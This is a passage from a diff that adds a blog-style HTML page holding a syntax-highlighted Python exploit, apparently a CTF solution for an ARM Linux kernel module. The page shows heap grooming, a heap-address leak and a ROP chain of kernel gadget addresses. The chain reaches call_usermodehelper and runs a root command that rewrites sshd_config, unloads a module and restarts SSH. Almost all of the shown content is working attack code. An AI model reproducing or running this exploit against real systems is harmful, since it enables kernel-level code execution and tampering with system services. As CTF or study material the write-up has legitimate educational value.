+</span><span style="color:#65737e;">    0x8010c040 &lt;cpu_suspend_abort+16&gt;         pop    {r4, r5, r6, r7, r8, sb, sl, fp, pc} &lt;0x8010c040&gt;
+</span><span style="color:#65737e;">    &#39;&#39;&#39;
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(heap+sl),stack+</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">30</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x804282e4</span><span style="color:#c0c5ce;">),stack+</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&#39;&#39;&#39;
+</span><span style="color:#65737e;">    0x804282e4                                pop    {r1, r2, r3}                  &lt;0x8010c040&gt;
+</span><span style="color:#65737e;">    0x804282e8                                sub    r0, r0, r1
+</span><span style="color:#65737e;">    0x804282ec                                rsb    r0, r0, r2
+</span><span style="color:#65737e;">    0x804282f0                                pop    {r4, pc}
+</span><span style="color:#65737e;">    &#39;&#39;&#39;
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(heap+agr+</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">),stack+</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">33</span><span style="color:#c0c5ce;">)  </span><span style="color:#65737e;">#r1
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x8010c020</span><span style="color:#c0c5ce;">),stack+</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">37</span><span style="color:#c0c5ce;">)  </span><span style="color:#65737e;">#pc
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&#39;&#39;&#39;
+</span><span style="color:#65737e;">    0x8010c020 &lt;__cpu_suspend+96&gt;             pop    {r0, pc}                      &lt;0x8010c020&gt;=
+</span><span style="color:#65737e;">    &#39;&#39;&#39;
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(heap+agr),stack+</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">38</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x80101524</span><span style="color:#c0c5ce;">),stack+</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">39</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&#39;&#39;&#39;
+</span><span style="color:#65737e;">    0x80101524 &lt;secondary_startup_arm+100&gt;    mov    sp, ip
+</span><span style="color:#65737e;">    0x80101528 &lt;secondary_startup_arm+104&gt;    ldr    ip, [sl, #0x10]
+</span><span style="color:#65737e;">    0x8010152c &lt;secondary_startup_arm+108&gt;    add    ip, ip, sl
+</span><span style="color:#65737e;">    0x80101530 &lt;secondary_startup_arm+112&gt;    mov    pc, ip
+</span><span style="color:#65737e;">    &#39;&#39;&#39;
+</span><span style="color:#c0c5ce;">    call_usermodehelper=</span><span style="color:#d08770;">0x8012f990
+</span><span style="color:#c0c5ce;">    offsets=(call_usermodehelper-(heap+sl))&amp;</span><span style="color:#d08770;">0xffffffff
+</span><span style="color:#c0c5ce;">    payload=</span><span style="color:#8fa1b3;">str_change</span><span style="color:#c0c5ce;">(payload,</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(offsets),sl+</span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">payload
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;"># 7f00099c
+</span><span style="color:#8fa1b3;">_client_20</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">#   0                                            0xf
+</span><span style="color:#65737e;">#  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#8fa1b3;">_server</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#96b5b4;">\x20</span><span style="color:#c0c5ce;">&#39;,</span><span style="color:#d08770;">0x1001</span><span style="color:#c0c5ce;">,&#39;</span><span style="color:#a3be8c;">a</span><span style="color:#c0c5ce;">&#39;*</span><span style="color:#d08770;">0x1001</span><span style="color:#c0c5ce;">)
+</span><span style="color:#8fa1b3;">_client_20</span><span style="color:#c0c5ce;">()
+</span><span style="color:#8fa1b3;">_server</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#96b5b4;">\x10</span><span style="color:#c0c5ce;">&#39;,</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">,&#39;</span><span style="color:#a3be8c;">a</span><span style="color:#c0c5ce;">&#39;*</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">)
+</span><span style="color:#8fa1b3;">_server</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#96b5b4;">\x10</span><span style="color:#c0c5ce;">&#39;,</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">,&#39;</span><span style="color:#a3be8c;">a</span><span style="color:#c0c5ce;">&#39;*</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">)
+</span><span style="color:#8fa1b3;">_server</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#96b5b4;">\x30</span><span style="color:#c0c5ce;">&#39;,</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">,&#39;</span><span style="color:#a3be8c;">b</span><span style="color:#c0c5ce;">&#39;*</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">)
+</span><span style="color:#8fa1b3;">_client</span><span style="color:#c0c5ce;">()
+</span><span style="color:#8fa1b3;">_client</span><span style="color:#c0c5ce;">()
+</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">12</span><span style="color:#c0c5ce;">):
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">_server</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#96b5b4;">\x20</span><span style="color:#c0c5ce;">&#39;,</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">,&#39;</span><span style="color:#a3be8c;">a</span><span style="color:#c0c5ce;">&#39;*</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">)
+</span><span style="color:#8fa1b3;">_server</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#96b5b4;">\x10</span><span style="color:#c0c5ce;">&#39;,</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">,&#39;</span><span style="color:#a3be8c;">d</span><span style="color:#c0c5ce;">&#39;*</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">)
+</span><span style="color:#8fa1b3;">_server</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#96b5b4;">\x10</span><span style="color:#c0c5ce;">&#39;,</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">,&#39;</span><span style="color:#a3be8c;">d</span><span style="color:#c0c5ce;">&#39;*</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">)
+</span><span style="color:#8fa1b3;">_server</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#96b5b4;">\x10</span><span style="color:#c0c5ce;">&#39;,</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">,&#39;</span><span style="color:#a3be8c;">d</span><span style="color:#c0c5ce;">&#39;*</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">data=</span><span style="color:#8fa1b3;">_client</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">heap = </span><span style="color:#8fa1b3;">u32</span><span style="color:#c0c5ce;">(data[:</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">])
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;"># cmd=b&#39;echo hello1 &gt; /tmp/hacked&#39;
+</span><span style="color:#c0c5ce;">cmd=</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">sed -i </span><span style="color:#96b5b4;">\&#39;</span><span style="color:#a3be8c;">s/Port 22/Port 2326/g</span><span style="color:#96b5b4;">\&#39;</span><span style="color:#a3be8c;"> /etc/ssh/sshd_config ;rmmod dirtymod;service ssh restart;sleep 2;</span><span style="color:#c0c5ce;">&#39;
+</span><span style="color:#c0c5ce;">payload = </span><span style="color:#8fa1b3;">_rop</span><span style="color:#c0c5ce;">(heap, cmd)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#8fa1b3;">success</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">hex</span><span style="color:#c0c5ce;">(heap))
+</span><span style="color:#8fa1b3;">_client_20</span><span style="color:#c0c5ce;">()
+</span><span style="color:#8fa1b3;">_server</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#96b5b4;">\x20</span><span style="color:#c0c5ce;">&#39;,</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(heap)[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">:</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">]+</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x8051ef90</span><span style="color:#c0c5ce;">)+</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)+(</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0xc</span><span style="color:#c0c5ce;">)//</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">*</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#8fa1b3;">_server</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#96b5b4;">\x10</span><span style="color:#c0c5ce;">&#39;,</span><span style="color:#d08770;">0x2000</span><span style="color:#c0c5ce;">, payload)
+</span><span style="color:#8fa1b3;">_server</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#96b5b4;">\x10</span><span style="color:#c0c5ce;">&#39;,</span><span style="color:#d08770;">0x2000</span><span style="color:#c0c5ce;">, payload)
+</span><span style="color:#8fa1b3;">_server</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#96b5b4;">\x10</span><span style="color:#c0c5ce;">&#39;,</span><span style="color:#d08770;">0x2000</span><span style="color:#c0c5ce;">, payload)
+</span><span style="color:#8fa1b3;">_server</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#96b5b4;">\x10</span><span style="color:#c0c5ce;">&#39;,</span><span style="color:#d08770;">0x2000</span><span style="color:#c0c5ce;">, payload)
+</span><span style="color:#8fa1b3;">_client</span><span style="color:#c0c5ce;">()
+</span></pre>
+</main>
+                <aside class="toc-sidebar">
+                    <div class="toc-sticky-container">
+                        <div class="toc-header">:: Contents ::</div>
+                        <ul class="toc-list"><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#exp">exp</a></li></ul>
+                    </div>
+                </aside>
+            </div> 
+    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
+        Built with Rust. <span style="color: #66ed59;">EOF</span>
+    </footer>
+    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
+    <script src="script.js"></script>
+</body>
+</html>
